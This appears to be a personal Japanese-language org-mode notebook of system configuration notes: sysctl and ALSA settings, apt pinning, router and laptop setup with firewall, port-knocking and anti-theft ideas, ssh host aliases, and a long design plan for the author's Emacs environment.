net.ipv4.tcp_no_metrics_save = 1

net.ipv4.tcp_moderate_rcvbuf = 1

net.core.netdev_max_backlog = 5000

***** alsa mixing
- ~/.asoundrc

pcm.my_card {
   type hw
   card 1
   # mmap_emulation true
}

pcm.dmixed {
   type dmix
   ipc_key 1024
   #  ipc_key_add_uid false   # let multiple users share
   #  ipc_perm 0666           # IPC permissions for multi user sharing (octal, default 0600)
   slave {
   pcm "my_card"
   #   rate 48000
   #   period_size 512
   }
}

pcm.dsnooped {
   type dsnoop
   ipc_key 2048
   slave {
   pcm "my_card"
   #   rate 48000
   #   period_size 128
   }
}

pcm.asymed {
   type asym
   playback.pcm "dmixed"
   capture.pcm "dsnooped"
}

pcm.pasymed {
   type plug
   slave.pcm "asymed"
}

pcm.dsp0 {
   type plug
   slave.pcm "asymed"
}

pcm.!default {
   type plug
   slave.pcm "asymed"
}

***** sid
****** preferences
- /etc/apt/preferences.d/preferences_sid
Package: *
Pin: release a=stable
Pin-Priority: 700

Package: *
Pin: release a=testing
Pin-Priority: 80

Package: *
Pin: release a=unstable
Pin-Priority: 90

****** sources
- /etc/apt/sources.list.d/sid.list

** RO:router
   [ro:router (rook)]

*** Policy
*** Device
*** General
**** OS
***** Kernel

**** Host Name
	 - rook
# 命名規則は RFC1178 を参照。
# 一覧にしたときに見やすいように文字数を統一する。文字は 8 文字以内がよい。
# よく使われている用語を使わない。会話によくでてくるものは、どちらであるか判断がつかなくなる。
# 一台のマシンと同じ名にしてはいけない。 shop1,shop2,shop3 などと区別を数字だけすると台数が増えると煩わしくなる。
# 自分や人物の名前を付けない。会話の中で判断がつかなくなる。
# 違う綴りを使うな。綴りをわざと変えると英語の苦手な人にとって混乱を招く。
# ドメイン名を避ける。
# 数字で始まる名前を付けない。
# 大文字を使うな。

# ホスト名から機器がわかること。
# ホスト名から役割がわかること。
	   [候補]
	   - 天体
	   - 任天堂のキャラクター マリオ、ゼルダ、ポケモン、カービー、など役割に合わせてソフトを分ける。
	   - 元素名
	   - チェス (自宅ネットワーク用)
		 King = Main server, Queen = Desktop, Bishop = laptop,
		 Knight = USB, Rook = router, Pawn = テスト機
		 Pawn には名前が付いている。 rook's Pawn,knight's Pawn,Bishop's Pawn,Queen's Pawn,King's Pawn
	   - 行政機関
		 naikaku = Main Server, soumu = Mail Server, bouei = Router,
		 zaimu = Data Server, monbu = Media Server, ...
		 # 行政機関は長い目で見ると再編されることがあるので注意。

*** Boot
*** System
*** Security
**** iptables
## locale からのみ ssh 許可
	 /usr/sbin/iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 12316 -j ACCEPT
**** knockd
## when knocked port "1,2,3,1,6", wol & open iptabels foward 12316
	 [[file:~/mydoc/etc/negative_list::knockd で wol][negative_list]]
*** Service
*** Backup
*** ssh
	- 外部からの ssh に対して使えるコマンドを制限。

** Laptop BI
   [laptop:bi (bishop)]
*** Device/Machine Spec
	- カメラ内蔵 (盗難対策用)
	- GPS (カーナビ用)
	- Wireless LAN
	- Bruetooth
	- バッテリー : １８時間 (商品に記載されている駆動時間は実駆動時間で 5 割～ 7 割程度と思ったほうがよい。)
	- 衝撃に強い物
	- 付属ソフトがないものを選ぶ
	- 光学ドライブ

**** tmp
	 - OS
	 - Memory
	 - CPU
	 - キーボード
	 - マウス
***** Maker
	  - ノートパソコンは故障時にメンテナンスがしにくいので BTO ではなくメーカー物のほうがいいかもしれない。
	  - 候補 - hp lenovo 富士通
***** Display
	  - (サイズ)
	  - 光沢液晶
	  - (タッチパネル)
***** Storege device
****** SSD
*** Boot
**** BIOS
	 - CD/FDD/USB からの起動を禁止。
	 - Password 設定。
**** bootloader
	 - nomalmode
	 - quick start mode (最小構成)
	 - no network mode
	 - Secret mode (trap)
**** runlevel
**** 盗難対策
***** 盗難前対策
	  - パーティション暗号化

***** 盗難後対策
	  - 起動時に GPS 位置記録＆送信
	  - ノーマルモードで起動時、起動後に内蔵カメラでキャプチャしパケット送信。
		キャプチャがしっかり顔をとらえられるような仕組みを考える。たとえば、画面に読みにくい文字を表示するなどして画面に近づけさせる。
	  - Global IP を自宅サーバーに送信。

*** General
**** OS
	 -
***** Kernel

**** Host Name
	 - bishop
# 命名規則は RFC1178 を参照。
# 一覧にしたときに見やすいように文字数を統一する。文字は 8 文字以内がよい。
# よく使われている用語を使わない。会話によくでてくるものは、どちらであるか判断がつかなくなる。
# 一台のマシンと同じ名にしてはいけない。 shop1,shop2,shop3 などと区別を数字だけすると台数が増えると煩わしくなる。
# 自分や人物の名前を付けない。会話の中で判断がつかなくなる。
# 違う綴りを使うな。綴りをわざと変えると英語の苦手な人にとって混乱を招く。
# ドメイン名を避ける。
# 数字で始まる名前を付けない。
# 大文字を使うな。

# ホスト名から機器がわかること。
# ホスト名から役割がわかること。
	   [候補]
	   - 天体
	   - 任天堂のキャラクター マリオ、ゼルダ、ポケモン、カービー、など役割に合わせてソフトを分ける。
	   - 元素名
	   - チェス (自宅ネットワーク用)
		 King = Main server, Queen = Desktop, Bishop = laptop,
		 Knight = USB, Rook = router, Pawn = テスト機
		 Pawn には名前が付いている。 rook's Pawn,knight's Pawn,Bishop's Pawn,Queen's Pawn,King's Pawn
	   - 行政機関
		 naikaku = Main Server, soumu = Mail Server, bouei = Router,
		 zaimu = Data Server, monbu = Media Server, ...
		 # 行政機関は長い目で見ると再編されることがあるので注意。
	   - 鳥の名前

*** Setting Files
**** /etc/Hosts
	 219.62.120.21     king
	 192.168.1.122     home

**** ~/.ssh/config
	 Host king
     HostName 219.62.120.21
     Port 12316
     IdentityFile ~/.ssh/kagi

	 Host rook
     HostName 192.168.1.1
     Port 12317
     IdentityFile ~/.ssh/kagi

	 Host home
     HostName 192.168.1.122
     Port 12316
     User home
     IdentityFile ~/.ssh/kagi

	 Host *
     Controlmaster auto
     ControlPath /tmp/%r@%h:%p
     ServerAliveInterval 60#

*** Security
**** firewall
**** anti MITM
	 - arpwatch
*** etc
*** Negative list
	- BIOS のパスワードは簡単に解除できるので悪戯防止程度と考えておく。

** Emacs
*** 1. Introduction
    :PROPERTIES:
    :CUSTOM_ID: Introduction
    :END:

**** 1.1. Policy
     :PROPERTIES:
     :CUSTOM_ID: Introduction policy
     :END:

***** 1.1.1. この文書について

この文章は個人の emacs の設計について記載する。

*この文章の目標*

1) Simple に記載する。

2) 誰が見ても理解できるものが理想。

   泥棒が家に入っても、何処に何があるのかがすぐに理解できる
   ものは、システムとしてはすばらしいと思う。
   ※泥棒には、何よりも入られないようにすることが大事。

***** 1.1.2. Purpose

1) 設計目的 (なぜ設計が必要か。)

   設定や拡張時の目的、基準を明確化。
   良質の物を構築する為に、意思決定の判断材料とする。
   基準が明確でないことは必要性の有無が曖昧になる。
   また、時間を浪費する。
   月日と共に、導入や削除を繰返すと煩雑なものになりがち。
   よって、設計が必要。

2) 目標 (期待成果)

   統合開発環境として構築。
   有料ソフトを越えるものにする。
   開発、文章作成時間の削減。
   迅速かつ正確な文章、コーディング。
   コードを読むスピードを上げる。

   - 短期
     + 一日 1000 行 coding

   - 中期
     + 一日 2000 行 coding

   - 長期
     + 一日 3000 行 coding

3) 基準

   設計の定期的見直し。 (1 年)

   開発に関係のない機能は最小限にとどめる。
   余計な機能で遅くなることがないように。

**** 1.2. Overview
     :PROPERTIES:
     :CUSTOM_ID: Introduction Overview
     :END:

***** 1.2.1. System Environment

想定環境
|---------|
| PC      |
|---------|
| Desktop |
| Laptop  |
|---------|

|---------------|
| Display Size  |
|---------------|
| Multi Display |
| 1680 x 1050   |
| 1280 x 1024   |
| (13 inch)     |
|---------------|

|---------|
| OS      |
|---------|
| windows |
| linux   |
| mac     |
|---------|

|---------|
| Version |
|---------|
|      22 |
|      23 |
|      24 |
|---------|

|----------|
| Terminal |
|----------|
| CUI      |
| GUI      |
| putty    |
|----------|

***** 1.2.2. Construction Directory
    :PROPERTIES:
    :CUSTOM_ID: Construction Directory
    :END:


# file 名に"init" を使わない。 anything などの補完時に干渉。
# 5 つ以上ネストする場合はディレクトリの再構成を検討。
# lisp は elisp/ にまとめて置く。 load-path, loaddef, byte-compile, grep が楽になる。
# 名前は、 suffix に"_e"を付ける。
# これには 2 つの効果が期待できる。
# 1 つ目は、名前の重複を避け削除などのヒューマンエラーを回避できる。
# 2 つ目は、補完時に混乱を避けることができる。
# 例えば prefix に名前をつけると、 edata, elisp, evar, ebackup, ebin, eusr...
# shell などの補完は先頭の文字から入力していくので煩雑になりがち。
# また、視認性もさがる。


#+BEGIN_EXAMPLE
.emacs.d/
  +--- init.el
  +--- elisp/
  |     +--- start.d/
  |	    +--- plugin/
  |     +--- mylisp/
  |
  +--- data_e/
  |     +--- ahk/
  |     +--- img/
  |     +--- ref/
  |     |     +--- rfc/
  |     +--- tool/
  |     +--- snippets/
  |     +--- auto-insert/
  |     +--- code/
  |     |     +--- umemo/
  |     |     +--- python/
  |     |     |     +--- interpreter/
  |     |     +--- elisp/
  |     |     |     +--- scratch/
  |     |     +--- C C++/
  |     |     +--- assembly/
  |     |
  |     +--- bookmarks
  |     +--- abbrev_defs
  |     +--- words
  |
  +--- var_e/
  | 	+--- thumbs/
  | 	+--- server/
  | 	+--- auto-save-list/
  | 	+--- recentf
  | 	+--- woman_cache.el
  | 	+--- save-place-file
  | 	+--- emacs-desktop
  | 	+--- ac-comphist.dat
  | 	+--- pylookup.db
  |
  +--- backup_e/   # created backups by emacs (no revision)

#+END_EXAMPLE

主な directory & file
|---------------------------------+-----------------------------------------------------|
| DIRECTORY/FILE                  | DESCRIPTION                                         |
|---------------------------------+-----------------------------------------------------|
| elisp/                          | 主に拡張や設定 file                                 |
|---------------------------------+-----------------------------------------------------|
|---------------------------------+-----------------------------------------------------|
| ----- start.d/                  | 起動時に呼ばれる設定 file の入った directory        |
|---------------------------------+-----------------------------------------------------|
| ---------- subroutines_start.el | 起動に必要な subroutines 。 byte-compile でも使う。 |
|---------------------------------+-----------------------------------------------------|
| ---------- 00_                  | Primary essensial                                   |
|---------------------------------+-----------------------------------------------------|
| ---------- 20~60_               | Extension  sufix: _ex_start.el                      |
|---------------------------------+-----------------------------------------------------|
| ---------- 70~80_               | Major mode  sufix: _mode_start.el                   |
|---------------------------------+-----------------------------------------------------|
| ---------- 90_                  | Final                                               |
|---------------------------------+-----------------------------------------------------|
| ----- plugin/                   | 拡張 file 保管場所                                  |
|---------------------------------+-----------------------------------------------------|
| ----- mylisp/                   | 自作 elisp                                          |
|---------------------------------+-----------------------------------------------------|

|--------------------+----------------------------|
| data_e/            | Version 管理する file      |
|--------------------+----------------------------|
|--------------------+----------------------------|
| ----- ref/         | Document file              |
|--------------------+----------------------------|
| ----- code/        |                            |
|--------------------+----------------------------|
| ----- snippets/    |                            |
|--------------------+----------------------------|
| ----- auto-insert/ |                            |
|--------------------+----------------------------|
| ----- tool/        |                            |
|--------------------+----------------------------|

|--------+------------------------------|
| var_e/ | Version 管理しない file      |
|--------+------------------------------|

|-----------+-------------------------|
| backup_e/ | emacs で編集した backup |
|           | Version 管理しない      |
|-----------+-------------------------|

***** 1.2.3. Data list and 格納方法
- system all file db
- filecache

|-------------+--------------------|
| File name   | Location           |
|-------------+--------------------|
| abbrev_defs | data_e/            |
| Bookmarks   | data_e/            |
| umemo       | data_e/code/umemo/ |
| words       | data_e/            |

****** Var_e
   :PROPERTIES:
   :CUSTOM_ID: var_e
   :END:

|----------------------+----------+-----------------------------------------|
| File name            | Location | Format                                  |
|----------------------+----------+-----------------------------------------|
| recentf              | var_e/   |                                         |
| ac-comphist.dat      | var_e/   |                                         |
| kill-ring-save.el    | var_e/   | (setq kill-ring '("text" "other text")) |
| pylookup.db          | var_e/   |                                         |
| savehist             | var_e/   | (setq ... ...)                          |
| cursor-place-save.el | var_e/   |                                         |
| woman_cache.el       | var_e/   | (setq ... ...)                          |
| auto-save-list/      | var_e/   |                                         |
| emacs-desktop        | var_e/   |                                         |

****** Log
   :PROPERTIES:
   :CUSTOM_ID: Emacs.log
   :END:

|-------------------+-------------+---------+-----------------------------------------------------------------|
| File name         | Location    | Rotate  | Format                                                          |
|-------------------+-------------+---------+-----------------------------------------------------------------|
| Emacs_%Y_%m.log   | data_e/log/ | 1 month | time:{Start, Exit}:user:system:{Debug, Multi, Default}:loadtime |
|                   |             |         | time:{open, save, close}:filename                               |
| kill-ring-log.log | data_e/log/ | 1 month | ("killed text" file-name line time)                             |
|                   |             |         |                                                                 |


|-----------------------+---------------------------------+--------+----------|
| File name             | Location                        | Rotate | Format   |
|-----------------------+---------------------------------+--------+----------|
| scratch_%Y.log        | data_e/code/elisp/scratch/      | year   | org-mode |
| py_interpreter_%Y.log | data_e/code/python/interpreter/ | year   | org-mode |

***** 1.2.4. Network
***** 1.2.5. Alias Command

|----------+-----+--------------+-----------------------|
| Function |     | Alias        | Description           |
|----------+-----+--------------+-----------------------|
| tabify   | \=> | space-to-tab | space から tab に変換 |
| untabify | \=> | tab-to-space | tab から space に変換 |
|----------+-----+--------------+-----------------------|

*** 2. Startup & Exit Emacs
    :PROPERTIES:
    :CUSTOM_ID: Startup & Exit Emacs
    :END:

**** 2.1. Startup

1) init.el

   - Header
     + Directory 構成
     + Changelog

   - load される file を 1 つに結合する。
     + file 名: all_in_one_start.el
     + 保存先: var_e/

2) Time

   - 3 秒以内

3) Load Method

   - 独自の起動オプション

   - 起動に必要な subroutines を load する。

   - Multi process load

   - Setting Environment
     + [[#path][Path の設定]]
     + directory 確認と構築。
     + source の方が新しかったら byte-compile するかどうか問合せる。
     + loaddef_start.el がなければ作成。
       * elisp/ 以下の autoload を取得。
       * byte-compile する。

   - Directory 内の prefix の付いた file を順番に load する。
     |--------+------------------------------------|
     | prefix | Description                        |
     |--------+------------------------------------|
     |     00 | Primary essensial                  |
     |     02 | base_start.el                      |
     |     04 | bindings_start.el                  |
     |     06 | loaddefs_start.el                  |
     |     08 | simple_start.el                    |
     |--------+------------------------------------|
     |  20~60 | Extension  sufix: _plugin_start.el |
     |  70~80 | Major mode  sufix: _mode_start.el  |
     |--------+------------------------------------|
     |     90 | Final                              |
     |     92 | face_start.el                      |
     |     98 | final_start.el                     |
     |--------+------------------------------------|

   - System に適した prefix file を読み込む。
     + OS: windows_, linux_, mac_
     + version: emacs22, emacs23, emacs24
     |---------+------------------|
     | prefix  | Description      |
     |---------+------------------|
     | windows | Windows System   |
     | linux   | Linux System     |
     | mac     | Mac System       |
     |---------+------------------|
     | emacs22 | Emacs Version 22 |
     | emacs23 | Emacs Version 23 |
     | emacs24 | Emacs Version 24 |
     |---------+------------------|


   - Debug
     + Debug 時は、 benchmark をとる。
     + 通常起動の場合は total time のみ。
     + 統計に使えるようにする。

4) default.el
   ;; default.el は .emacs よりも後になってから読み込まれる
   ;; 読み込まないようにする
   ;; (setq inhibit-default-init t)
   ;; after-init-hook を使うのも有効
   default.el があれば読み込むかどうか確認をする elisp を書く。

5) 起動後の表示

   - 画面の 9 割を frame で埋める。
   - 分割表示。
     | *Messages* | *scratch* |
   - Error があれば Error buffer 表示。
   - auto-save-file があれば、開く。
   - 終了時に開いていた buffer の link 付き一覧を作成。

6) [[#Running%20time][起動／終了 log]]

7) 遅延 load

   - init.el 以降の autoload は、遅延 load する。
   - 遅延 load で設定した lisp をコマンドでまとめて load 。

**** 2.2. Exit

1) Prompt

   - process 終了, file 保存の確認はしない。

2) Cleanup

   - 必要であれば Prompt 表示し byte-compile する。
   - loaddef が無いか、若しくは elisp/ 以下の file よりも古
     ければ、 Prompt を表示し loaddef を update 。

3) Check Next Safety Run

   - 次回の起動が無事に行われるか確認。
     :: emacs を起動したままもう 1 つ emacs を開き
     無事に起動できなければ、そのまま終了してもいいかどうか
     prompt を出す。

4) [[#Running%20time][起動／終了 log]]

**** Server & Daemon
**** --debug-init
**** tmp

- dumping
  http://www.emacswiki.org/emacs/DumpingEmacs
*** 3. Environment
**** Path
     :PROPERTIES:
     :CUSTOM_ID: Path
     :END:

***** Load Path

- recursive "~/.emacs.d/elisp/"

***** Exec Path
***** Info Path
**** 日本語

- 文字コード

- 現在の文字コード設定を調べる

- 文字コードを指定する

- 日本語入力
  + ATOK
  + mozc
  + canna

- 英単語 補完 翻訳

**** Encoding
- AutoCodingAlist
  http://www.emacswiki.org/emacs/AutoCodingAlist
*** 4. Files
    :PROPERTIES:
    :CUSTOM_ID: Files
    :END:

**** 3.1. Open

最速で見つけて開く

1) Find Method
   - anything
   - dired
   - minibuffer
   - Drag and Drop
   - Cursor 位置の File ・ URL を開く

2) Open from list

   - list の取扱
     + list に binary file を含まない。 Command で切替。
     + 拡張子ごとに色分け
     + 対象から外れた箇所は見えにくくする。

   - Data Base

     + All file
     + 起動時に DB があるか確認。
       無いか古ければ、 idle-time に DB 作成コマンドを登録。
     + midnight に自動で作成。
     + windows では everything の DB を利用。
     + 更新間隔: 24 時間
       保存先: var_e/

   - Filecache
     + 非同期で update
     + 起動時に idle-time に cache 作成コマンドを登録。
     + cache 対象
       * elisp/
       * plugin/
       * mylisp/
       * start.d/
       * data_e/code/
       * data_e/snippet/
     + 保存先: var_e/

   - History

   - Current Directory

   - Bookmark

     + 保存先: data_e/

   - Find command

     + find command で listup

3) まとめて開く

   - list で mark した file 。
   - Bookmark
   - Current Directory

4) Remote file :: 簡易に remote file を開く

   - [[#remote%20emacs][Remote file]]

**** 3.2. Save
***** 3.2.1. Command

- すべての buffer を保存する。

- Rename
  + rename 前の file を削除するかどうか prompt

***** 3.2.2. Before Save

1) 表題を自動的にファイル名にする
2) テキスト整形 [掘り下げる必要あり miss-typecheck
   delete-last-white-space etc..]

***** 3.2.3. After Save

[保留]
- chmod +x
  + http://www.emacswiki.org/emacs/MakingScriptsExecutableOnSave

***** 3.2.4. Backup

*Emacs で対応できるもの*

1) ソフト要因の障害対策

   - 主な障害。
     |----+---------------------------------------|
     | 1. | 編集中の buffer の損失。 Crash & 停電 |
     | 2. | 削除                                  |
     | 3. | 上書き                                |
     |----+---------------------------------------|

   - [[#Version%20Control][Version Control]]
     対応できる障害: *2. 削除* *3. 上書き*

   - Auto-save
     対応できる障害: *1.編集中の buffer の損失。 Crash & 停電*
     Control Auto-save
     do-auto-save
     auto-save-interval

   - backup 場所を一箇所にまとめる。
     /tmp 等は、再起動すると削除されるので NG!! 停電などに弱
     い。一箇所にまとめるので file の location を付加する。
     ex. ~/.backupdir/!root!home!.bashrc


2) ハード要因の障害対策

   - 主な障害。
     |----+------------|
     | 1. | HDD の故障 |
     |----+------------|

   	 + Remote Version Control
       SVN で Remote Machine にコミット
       対応できる障害: *1.HDD の故障*

   	 + Remote Machine に Mirroring
       対応できる障害: *1.HDD の故障*

3) 外的要因の障害対策

   - 主な障害
     |----+------|
     | 1. | 紛失 |
     | 2. | 盗難 |
     | 3. | 災害 |
     |----+------|
     すなわち、記憶媒体を失う。
     ハード要因に近い。

   	 + [[#cryptfile][Crypt File]]
       対応できる障害: *2.盗難*

4) 復元

   - crash して auto-save された file
     + 一覧表示
     + 比較
     + すべて破棄するコマンド
     + すべて tmp directory に移動するコマンド
     + http://www.emacswiki.org/emacs/RevertBuffer

****** Version Control
    :PROPERTIES:
    :CUSTOM_ID: Version Control
    :END:

     - 一覧表示
     - 比較
     - 最後に Version Control された file に戻る。
     - file 編集時その buffer 上で commit log を書く。

******* Local

初セーブは、 old file として backup
以後は、各セーブごとに、 new file として backup
- save した回数で挙動を変える。 [保留]
  (setq buffer-backed-up nil) と C-u C-u C-s を使う。
mode-line に local vc の revision number を表示
info 32.1.2 Version Control and the Mode Line

******* Remote Repositories [保留]
***** 3.2.5. Crypt File
      :PROPERTIES:
      :CUSTOM_ID: cryptfile
      :END:

**** 3.3. File Handling
***** Dired

1) Base

   - tab 化
     dired grouping tab 化する

   - dired color
     + .zshrc の設定に準拠

   - dired launch

   - mode-line
     + Full path 表示
     + line, column 非表示

   - dired auto refresh

2) Files Infomation

   - File Size
   - File Permission
   - Time Stamp
     + Modification time
     + Access time
     + Change Status time
   - Disk space
   - Current Directory Total Size
   - Select Directory Total Size
   - Count Current Directory File
   - Count Select Directory File
   - Owner & Group

3) Sort

   - 名前
   - Size
   - 日時
   - 種類

4) Change things

   - Rename
   - Permission
   - Time Stamp
   - Change Owner & Group
     http://www.emacswiki.org/emacs/SudoSave
   - Attribute 変更
   - Format
     + ファイルの文字コードを一括変換
   - File format change
     + excel, word powerpoint pdf etc...
   - 切取り貼り付けで file を move (x-finder like)

5) Delete

   - Move to system trash

6) Archive
   - tar/lzh の内容表示/ 展開

7) Metadata

   - file tag 付け

8) Misc
   + dired から印刷
   + dired から関連付けられたソフトで開く
   + ファイルを開く時にショートカットを辿る
     http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=findfile%20symlink
   + file を一つにまとめる。
   + dired で Windows のリンクを扱う ― w32-symlinks
     http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dired%20fiber
   + diredPlus
     http://www.emacswiki.org/emacs/DiredPlus
**** 3.4. Convert

- word to text http://www.emacswiki.org/emacs/UnDoc
- pdf to text http://www.emacswiki.org/emacs/UnPdf
- xls to text http://www.emacswiki.org/emacs/UnXls

**** tmp
+ ido.el 検討

*** 5. Buffer
    :PROPERTIES:
    :CUSTOM_ID: buffer
    :END:

**** 4.1. Handling

1) Switch Buffer

   - 速度優先

     + 特定の Key Command に Switch/Find-file を定義。
     + 長押し切替

   - 曖昧

     + iswitchb

     + Cycling
       * F9 で buffer を cycling する
   	   * BufferRing
   	     - http://www.emacswiki.org/emacs/BufferRing
       * http://www.emacswiki.org/emacs/ControlTABbufferCycling
       * http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=cycle%20buffers
       * http://www.mir2.org/igor/emacs/pc-bufsw.html

     + バッファ内の文字でバッファを切り替え

   - 正確性優先

     + バッファリストの取得

     + 常に buffer リストを表示して置く window
       buffer が追加されたり削除されたら自動で更新

2) Rename Buffer

   - wdired のように rename

3) Delete Buffer

   - 自動削除
     + tempbuf
   - 最後に閉じた buffer を復元

4) Buffer List の操作

   - 指定した buffer を tab にスタックする。
   - tag 付

5) Clone Buffer

**** 4.2. Attribute

1) Local Variable

   File Local Variable
   - 接頭辞 -*- ~ -*-
     Major mode のみ設定する。
     接尾辞に major mode を指定するよりもすこし速い。

   - 接尾辞
     "^L" 接尾辞を書く前に改ページを挿入する。
     最後に file 名を挿入

*File Local Variable でよく使う変数*
(ref. http://www.kmc.gr.jp/~tak/memo/emacs-local-variable.html)
|-------------------+----------------------------------------------------------------------|
| mode              | emacs-lisp, python                                                   |
|-------------------+----------------------------------------------------------------------|
| coding            | utf-8, euc-jp                                                        |
|-------------------+----------------------------------------------------------------------|
| backup-inhibited  | t,nil                                                                |
|-------------------+----------------------------------------------------------------------|
| read-only         | t,nil                                                                |
|-------------------+----------------------------------------------------------------------|
| fill-column       | オートフィル (自動折り返し) を行う桁位置を数字で指定します。         |
|-------------------+----------------------------------------------------------------------|
| compile-command   | M-x compile で実行されるシェルコマンドを文字列で指定します。         |
|                   | この変数の名前は -command で終わっていますが、                       |
|                   | 標準でプロパティ safe-local-variable が設定されていて文字列であれば  |
|                   | 自由に値を設定できます。                                             |
|-------------------+----------------------------------------------------------------------|
| version-control   | 番号つきバックアップファイル (foo.c.~1~ など) の作り方を制御します。 |
|                   | t なら常に作り、 nil なら既に番号つきのバックアップファイルがある    |
|                   | 場合のみ作ります。 never に設定すると全く作りません                  |
|                   | (foo.c~のような通常のバックアップファイルを作ります) 。              |
|-------------------+----------------------------------------------------------------------|
| kept-new-versions | 番号つきバックアップファイルを作るとき、                             |
| kept-old-versions | 際限なくバックアップファイルが増えるのを防ぐために Emacs             |
|                   | は新しい方、または古い方から一定数のファイルを残して削除します。     |
|                   | このとき残すファイルの数を指定するための変数です。                   |
|-------------------+----------------------------------------------------------------------|


2) Hide Stuff

   - outline
     + 特定の file を Open 時に outline で表示する。
     + Commant は隠さない。
     + document hide show
     + region hide show

3) Misc

   - Protect
     kill buffer されないようにする

   - ファイルを開く/ 保存/ 読み込み直しを簡単に ― disk
     他のソフトが開いている file を編集したら自動で開きなおす。

   - 内容の無いファイルを削除
     http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=delete%20nocontents

   - 開いている file を root の権限に変更する。

***** View
     :PROPERTIES:
     :CUSTOM_ID: view
     :END:

読込専用
コードや文章を読むのに便利な機能を搭載する。

- 片手で操作できるようにする。
  + Space を Ctrl にする。

- Command
  + 縦、横のハイライト
  + 不可視文字を表示
  + 書込み失敗後、 読込専用を解除して失敗時の command を実行。
  + Cycle buffer move
    * file buffer のみ移動する。
    * view mode で other-window した場合移動先が
      view-mode でなければ view-mode にする。
  + 全ての file buffer を view mode にする。

- Mode-line の色を変更。
- 書込みミス時に error 音

**** 4.3. Minibuffer

- find-file minibufer のコマンドで分岐

  + find-file-other-window
  + find-file-other-frame
  + バイナリで編集する
  + root の権限で開く

- M-x の補完を iswitchb のようにしたい ― mcomplete

- 不要時にはデフォルト値を表示しない
  http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=minibuf-eldef

- [[#minibuffer%20history][Minibuffer history]]

**** 4.4. Diff
***** Diff File
***** Diff Buffer
***** Diff Directory
***** Diff Hash
**** tmp

- auto-mode-alist
  + excel word pdf
  + archive mode
    * http://www.emacswiki.org/emacs/ArchiveMode

- ShadowFile.el
  http://www.emacswiki.org/emacs/ShadowFile

- grep-edit
  http://d.hatena.ne.jp/rubikitch/20081025/1224869598

- moccur-edit

*** 6. Keybind
    :PROPERTIES:
    :CUSTOM_ID: Keybind
    :END:

**** 5.1. Policy

- Ctrl-[数字]

- 移動は独立 key 若しくは、１ストローク。

- カーソルキーは使わない

- 打数よりも速度優先。
  ストロークの打数が少く、早ければ其の限りではない。

- コマンド統合
  条件分岐させてコマンドを統合できるものは統合する。
  優等席の key を有効活用する。

- 連打が必要なコマンドは独立キー 若しくは、１ストローク。

- console
  http://www.emacswiki.org/emacs/ConsoleKeys

*Change*
|-------------+-----+--------------|
| Old key     |     | New key      |
|-------------+-----+--------------|
| Caplock     | \=> | Ctrl         |
| 無変換      | \=> | Alt          |
| 変換        | \=> | Backspace    |
| Space       | \=> | Space & Ctrl |
| Shift_Right | \=> | 半角/ 全角   |
| Alt_Right   | \=> | Hyper        |
| 半角/ 全角  | \=> | ESC          |
| ";" "+"     | \=> | "-" "="      |
| "-" "="     | \=> | ";" "+"      |
|-------------+-----+--------------|

*Self*
|------+-----------------------------------------------------|
| key  | Description                                         |
|------+-----------------------------------------------------|
| a~z  | self-insert                                         |
| A~Z  | Programming mode では前後の文脈から入力内容の分岐   |
| 0~9  | http://www.emacswiki.org/emacs/OpeningQuote         |
| 記号 |                                                     |
|------+-----------------------------------------------------|

*Function*
home position から離れているが、独立した key なので連打できる。
|----------+-------------|
| Function | Description |
|----------+-------------|
| F1 ~ F4  | Macro 系    |
| F5 ~ F8  | 移動系      |
| F9 ~ F12 | その他      |
|----------+-------------|

*Modifier*
|----------+--------------|
| Modifier | Description  |
|----------+--------------|
| Control  |              |
| Shift    |              |
| Alt      |              |
| Super    | Heavy Script |
| Hyper    | Test keybind |
|----------+--------------|

*Prefix*
|--------+--------------------|
| prefix | Map                |
|--------+--------------------|
| C-x    | Misc               |
| C-c    | Major Monor        |
| C-e    | Edit               |
| C-f    | Universal Argument |
| C-:    | Switch Buffer      |
|--------+--------------------|

*ストローク*
編集コマンド は１ストロークが望ましい。
右手、左手を交互に打つ keybind は入力が速い。
片手で 2 ストローク入力は、同じ key でない限り遲い。
|---+-----------------------+----------------------------------+----------------+---------|
|   | Key                   | Description                      | Feature        | Example |
|---+-----------------------+----------------------------------+----------------+---------|
| 1 | 1 ストローク          | 片手のみで入力できる             | Prefix         | C-e     |
|   | 左手                  |                                  | Toggle Command | C-q     |
|---+-----------------------+----------------------------------+----------------+---------|
| 2 | 1 ストローク          | Ctrl を押す為、両手が必要        | Move Command   | C-n     |
|   | 右手 (両手)           | 編集時に利用する command         | Edit Command   | C-k     |
|---+-----------------------+----------------------------------+----------------+---------|
| 3 | 2 ストローク          | 素早く入力する必要がある command | Edit Command   | C-x C-k |
|   | 両手                  |                                  | Move Command   | C-c C-o |
|   | Modifier key 固定     |                                  |                |         |
|---+-----------------------+----------------------------------+----------------+---------|
| 4 | 2 ストローク          | 冷静に入力する必要がある command |                | C-x k   |
|   | 両手                  |                                  |                | C-c i   |
|   | Modifier key リリース |                                  |                |         |
|---+-----------------------+----------------------------------+----------------+---------|
| 5 | 2 ストローク          | 片手のみで入力できる             |                | C-x C-f |
|   | 左手のみ              |                                  |                | C-c C-w |
|   | Modifier key 固定     |                                  |                |         |
|---+-----------------------+----------------------------------+----------------+---------|
| 6 | 2 ストローク          | 片手のみで入力できる             | kill-buffer    | C-x f   |
|   | 左手のみ              | 入力ミスを防ぎたい command       | kill-emacs     | C-c w   |
|   | Modifier key リリース |                                  |                | C-x c   |
|---+-----------------------+----------------------------------+----------------+---------|

*keyboard img*
- [[file:~/.emacs.d/etc/data/emacs_ctrl_keyboard_ja.png][Ctrl]]
  Ctrl 押下時の key の押しやすさを点数下
  10 点満点の減点方式
  space が一番大きい key であり押しやすい
  enter も大きい key であり小指で押すが比較的押しやすい。
  押しやすい指は親指、中指、人差し指、薬指、小指の順である。
  大体この指の順と ホームポジションを基準にして減点している。

- [[file:~/.emacs.d/etc/data/emacs_alt_keyboard_ja.png][Alt]]

**** 5.2. Repeat
**** 5.3. Chord

- Only View mode

**** 5.4. Hold
**** 5.5. Mouse

- プレゼン用に使う。
- 右クリックでプレゼン用のコマンド表示
  + 拡大／縮小
  + 色の変更

***** Avoidance
**** 5.6. Maintenance

[[#Keybind%20Maintenance][Keybind Maintenance]]

**** 5.7. Space as ctrl
